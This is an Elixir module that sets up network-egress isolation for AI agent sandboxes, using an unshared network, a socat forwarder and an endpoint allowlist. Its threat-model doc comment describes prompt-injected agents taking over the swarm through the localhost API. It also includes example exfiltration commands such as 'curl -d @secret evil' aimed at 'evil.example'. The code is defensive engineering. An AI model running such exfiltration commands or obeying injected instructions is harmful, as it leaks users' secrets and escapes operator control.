defmodule Genswarms.Backends.EgressGuard do
  @moduledoc """
  Network-egress isolation for agent sandboxes (`network: :isolated`).

  ## Threat model

  An agent that ingests untrusted/external content (a web page, a third-party
  file, a message from an outside user) can be *prompt-injected*: the attacker
  then controls what the agent does. Because agent sandboxes share enough of the
  host to reach the orchestrator (bwrap shares the host network namespace; a
  `:local` agent is a bare host process), an injected agent can:

    * reach the orchestrator REST/WS API on `localhost` and escalate from
      "controls its own sandbox" to "controls the whole swarm" (other agents,
      objects, the task queue / SQLite state), and
    * exfiltrate secrets/context to an arbitrary host (`curl -d @secret evil`).

  The topology is the intended capability boundary for inter-agent messaging;
  these out-of-band network paths bypass it. `:isolated` mode closes them.

  ## Mechanism

  `:isolated` gives the sandbox **no network at all** (bwrap `--unshare-net`,
  docker `--network none`). The only egress is a host-side Unix-domain socket,
  bind-mounted into the sandbox, that a `socat` forwarder pins to the resolved
  LLM endpoint host:port. A `.curlrc` injected into the sandbox makes the
  agent's `curl` (subzeroclaw's transport — see `subzeroclaw.c`) connect through
  that socket automatically.

  Net effect inside the sandbox:

      curl http://localhost:4000/...   -> fails (no network)
      curl https://evil.example/...    -> fails (socket only reaches the LLM)
      curl $SUBZEROCLAW_ENDPOINT        -> works (the one pinned destination)

  TLS stays end-to-end between the agent's `curl` and the LLM; `socat` only
  relays bytes and the destination host:port is fixed on the host, not chosen by
  the agent.

  ## Endpoint allowlist

  The forwarder destination is the resolved endpoint, and a per-agent `:endpoint`
  is attacker-influenceable (the dynamic add-agent API). To stop an isolated agent
  being pinned to an untrusted host (which would turn the forwarder itself into an
  exfiltration channel), a per-agent endpoint is honored only if its host is
  allowlisted — the server's own endpoint host, or `GENSWARMS_ALLOWED_ENDPOINTS`
  (comma-separated). The operator-controlled env/default endpoint is always
  trusted. An isolated agent whose endpoint is not allowed fails to start
  (fail closed) rather than forwarding to an arbitrary destination.
  """

  require Logger

  @default_endpoint "https://openrouter.ai/api/v1/chat/completions"

  # Path of the forwarder socket as seen *inside* the sandbox. The agent
  # workspace is bind-mounted at /workspace, so a socket created in the host
  # workspace dir is visible here with no extra bind.
  @sandbox_socket "/workspace/.llm.sock"
  @sandbox_socket_name ".llm.sock"

  # Docker sidecar: the socket lives in a shared docker volume mounted at /egress
  # in both the sidecar and the (`--network none`) agent container.
  @docker_sandbox_socket "/egress/llm.sock"
  @docker_egress_mount "/egress"

  # Two forwarder kinds:
  #   :host_socat     — bwrap: socat spawned by the BEAM; socket in the workspace.
  #                     Works because the BEAM and the bwrap sandbox share one kernel.
  #   :docker_sidecar — :docker backend: socat runs in a sidecar *container* sharing
  #                     a docker volume with the agent. Required on Docker Desktop,
  #                     where a host-side (macOS-kernel) socket cannot be connect()ed
  #                     from a sibling VM container — the socket must be VM-side.
  defstruct [:kind, :port, :socket_path, :sidecar, :volume]

  @type t :: %__MODULE__{
          kind: :host_socat | :docker_sidecar | nil,
          port: port() | nil,
          socket_path: String.t() | nil,
          sidecar: String.t() | nil,
          volume: String.t() | nil
        }

  @doc "Whether the agent config requested network isolation."
  @spec isolated?(map()) :: boolean()
  def isolated?(config), do: Map.get(config, :network, :open) == :isolated

  @doc "Sandbox-side path of the forwarder socket (for `.curlrc`)."
  @spec sandbox_socket() :: String.t()
  def sandbox_socket, do: @sandbox_socket

  @doc "Host-side path of the forwarder socket, given the agent workspace."
  @spec host_socket_path(String.t()) :: String.t()
  def host_socket_path(workspace), do: Path.join(workspace, @sandbox_socket_name)

  @doc """
  bwrap flags that drop the sandbox's network namespace under isolation.
  Returns `[]` for the default (`:open`) so existing behavior is unchanged.
  """
  @spec bwrap_net_args(map()) :: [String.t()]
  def bwrap_net_args(config) do
    if isolated?(config), do: ["--unshare-net"], else: []
  end

  @doc "Effective LLM endpoint URL: explicit config, then env, then default."
  @spec resolve_endpoint(map()) :: String.t()
  def resolve_endpoint(config) do
    Map.get(config, :endpoint) || operator_endpoint()
  end

  # The operator-controlled endpoint (env or built-in default). Always trusted
  # because it cannot be set through the per-agent API surface.
  defp operator_endpoint do
    System.get_env("SUBZEROCLAW_ENDPOINT") || @default_endpoint
  end

  @doc """
  Resolves the endpoint the forwarder is pinned to, enforcing the allowlist for
  attacker-influenceable endpoints.

    * No per-agent `:endpoint` → the operator-controlled env/default endpoint
      (always allowed).
    * A per-agent `:endpoint` → honored only if its host is allowlisted (the
      server's own endpoint host, or `GENSWARMS_ALLOWED_ENDPOINTS`). Otherwise
      `{:error, {:endpoint_not_allowed, endpoint}}` — fail closed, so an isolated
      agent is never pinned to an untrusted exfiltration target.
  """
  @spec resolve_allowed_endpoint(map()) :: {:ok, String.t()} | {:error, term()}
  def resolve_allowed_endpoint(config) do
    case Map.get(config, :endpoint) do
      nil ->
        {:ok, operator_endpoint()}

      endpoint when is_binary(endpoint) ->
        if endpoint_host_allowed?(endpoint) do
          {:ok, endpoint}
        else
          {:error, {:endpoint_not_allowed, endpoint}}
        end

      _ ->
        {:error, :invalid_endpoint}
    end
  end

  @doc """
  Hosts a per-agent config may point an isolated forwarder at: the server's own
  endpoint host plus `GENSWARMS_ALLOWED_ENDPOINTS` (comma-separated hosts).
  """
  @spec allowed_endpoint_hosts() :: [String.t()]
  def allowed_endpoint_hosts do
    server_host =
      case endpoint_target(operator_endpoint()) do
        {:ok, {host, _port}} -> [String.downcase(host)]
        _ -> []
      end

    configured =
      (System.get_env("GENSWARMS_ALLOWED_ENDPOINTS") || "")
      |> String.split(",", trim: true)
      |> Enum.map(&(&1 |> String.trim() |> String.downcase()))
      |> Enum.reject(&(&1 == ""))

    Enum.uniq(server_host ++ configured)
  end

  defp endpoint_host_allowed?(url) do
    case endpoint_target(url) do
      {:ok, {host, _port}} -> String.downcase(host) in allowed_endpoint_hosts()
      _ -> false
    end
  end

  @doc """
  Parses an endpoint URL into the `{host, port}` the forwarder connects to.
  Falls back to 443 (https) / 80 (http) when the URL omits an explicit port.
  """
  @spec endpoint_target(String.t()) :: {:ok, {String.t(), pos_integer()}} | {:error, term()}
  def endpoint_target(url) when is_binary(url) do
    case URI.parse(url) do
      %URI{host: host, port: port, scheme: scheme} when is_binary(host) and host != "" ->
        {:ok, {host, port || default_port(scheme)}}

      _ ->
        {:error, :invalid_endpoint}
    end
  end

  def endpoint_target(_), do: {:error, :invalid_endpoint}

  defp default_port("http"), do: 80
  defp default_port(_), do: 443

  @doc """
  Builds the `socat` invocation `{executable, argv}` for the forwarder:
  a forking Unix-listener that relays each connection to `host:port`.
  `unlink-early` clears a stale socket; `mode=0600` keeps it owner-only.
  """
  @spec socat_command(String.t(), String.t(), pos_integer()) :: {String.t(), [String.t()]}
  def socat_command(host_socket_path, host, port) do
    left = "UNIX-LISTEN:#{host_socket_path},fork,mode=0600,unlink-early"
    right = "TCP:#{host}:#{port}"
    {find_executable("socat"), [left, right]}
  end

  @doc "Contents of the `.curlrc` that routes the agent's curl through the socket."
  @spec curlrc_content(String.t()) :: String.t()
  def curlrc_content(sandbox_socket \\ @sandbox_socket),
    do: ~s(unix-socket = "#{sandbox_socket}"\n)

  @doc "Sandbox-side socket path for the docker sidecar (shared `/egress` volume)."
  @spec docker_sandbox_socket() :: String.t()
  def docker_sandbox_socket, do: @docker_sandbox_socket

  @doc "Per-agent docker volume that carries the egress socket."
  @spec docker_volume_name(String.t()) :: String.t()
  def docker_volume_name(container_name), do: "szc-egress-#{container_name}"

  @doc "Sidecar container name for an agent container."
  @spec docker_sidecar_name(String.t()) :: String.t()
  def docker_sidecar_name(container_name), do: "#{container_name}-egress"

  @doc "`-v` args mounting the egress volume into the agent container."
  @spec docker_agent_volume_args(String.t()) :: [String.t()]
  def docker_agent_volume_args(container_name),
    do: ["-v", "#{docker_volume_name(container_name)}:#{@docker_egress_mount}"]

  # Image that provides socat as its entrypoint (e.g. alpine/socat: `socat <a> <b>`).
  defp docker_sidecar_image,
    do: Application.get_env(:genswarms, :egress_image, "alpine/socat")

  @doc """
  `docker run` argv for the sidecar: a forking Unix-listener in the shared volume
  that relays to the pinned endpoint. The agent reaches it via the volume socket;
  the destination host:port is fixed here, not chosen by the agent.
  """
  @spec docker_sidecar_run_args(String.t(), String.t(), String.t(), String.t(), pos_integer()) ::
          [String.t()]
  def docker_sidecar_run_args(sidecar_name, volume, image, host, port) do
    [
      "run",
      "-d",
      "--rm",
      "--name",
      sidecar_name,
      "-v",
      "#{volume}:#{@docker_egress_mount}",
      image,
      "UNIX-LISTEN:#{@docker_sandbox_socket},fork,mode=0666,unlink-early",
      "TCP:#{host}:#{port}"
    ]
  end

  @doc """
  Starts the egress forwarder for an isolated agent.

  Writes the sandbox `.curlrc`, removes any stale socket, and spawns the `socat`
  forwarder pinned to the resolved endpoint. Returns `{:ok, t}` (held by the
  backend for cleanup) or `{:error, reason}`.
  """
  @spec start_forwarder(String.t(), map()) :: {:ok, t()} | {:error, term()}
  def start_forwarder(workspace, config) do
    with {:ok, endpoint} <- resolve_allowed_endpoint(config),
         {:ok, {host, port}} <- endpoint_target(endpoint) do
      socket_path = host_socket_path(workspace)
      File.rm(socket_path)
      File.write!(Path.join(workspace, ".curlrc"), curlrc_content())

      {socat, args} = socat_command(socket_path, host, port)

      if is_nil(socat) or not File.exists?(socat) do
        {:error, :socat_not_found}
      else
        port_ref =
          Port.open({:spawn_executable, socat}, [
            :binary,
            :exit_status,
            {:args, args}
          ])

        {:ok, %__MODULE__{kind: :host_socat, port: port_ref, socket_path: socket_path}}
      end
    end
  end

  @doc """
  Starts the egress forwarder for an isolated **docker** agent as a sidecar
  container.

  socat must run VM-side (same kernel as the agent container) — a host-side socket
  cannot be connect()ed from a sibling container on Docker Desktop. So the
  forwarder runs in its own container sharing a docker volume (the socket) with the
  `--network none` agent. Writes the agent `.curlrc`, (re)creates the volume, and
  launches the sidecar pinned to the resolved endpoint.
  """
  @spec start_docker_sidecar(String.t(), String.t(), map()) :: {:ok, t()} | {:error, term()}
  def start_docker_sidecar(container_name, workspace, config) do
    with {:ok, endpoint} <- resolve_allowed_endpoint(config),
         {:ok, {host, port}} <- endpoint_target(endpoint) do
      volume = docker_volume_name(container_name)
      sidecar = docker_sidecar_name(container_name)

      # Route the agent's curl through the shared-volume socket.
      File.write!(Path.join(workspace, ".curlrc"), curlrc_content(@docker_sandbox_socket))

      # Fresh sidecar + volume (clear any leftovers from a previous run).
      System.cmd("docker", ["rm", "-f", sidecar], stderr_to_stdout: true)
      System.cmd("docker", ["volume", "rm", "-f", volume], stderr_to_stdout: true)
      System.cmd("docker", ["volume", "create", volume], stderr_to_stdout: true)

      args = docker_sidecar_run_args(sidecar, volume, docker_sidecar_image(), host, port)

      case System.cmd("docker", args, stderr_to_stdout: true) do
        {_, 0} ->
          {:ok, %__MODULE__{kind: :docker_sidecar, sidecar: sidecar, volume: volume}}

        {out, code} ->
          {:error, {:sidecar_failed, code, String.slice(out, 0, 300)}}
      end
    end
  end

  @doc "Stops the forwarder and frees its resources. Safe on nil."
  @spec stop_forwarder(t() | nil) :: :ok
  def stop_forwarder(nil), do: :ok

  def stop_forwarder(%__MODULE__{kind: :docker_sidecar, sidecar: sidecar, volume: volume}) do
    if sidecar, do: System.cmd("docker", ["rm", "-f", sidecar], stderr_to_stdout: true)
    if volume, do: System.cmd("docker", ["volume", "rm", "-f", volume], stderr_to_stdout: true)
    :ok
  end

  def stop_forwarder(%__MODULE__{port: port, socket_path: socket_path}) do
    if port do
      try do
        Port.close(port)
      rescue
        _ -> :ok
      end
    end

    if socket_path, do: File.rm(socket_path)
    :ok
  end

  defp find_executable(name) do
    paths = [
      "/run/current-system/sw/bin/#{name}",
      "/usr/bin/#{name}",
      "/bin/#{name}"
    ]

    Enum.find(paths, &File.exists?/1) || System.find_executable(name)
  end
end
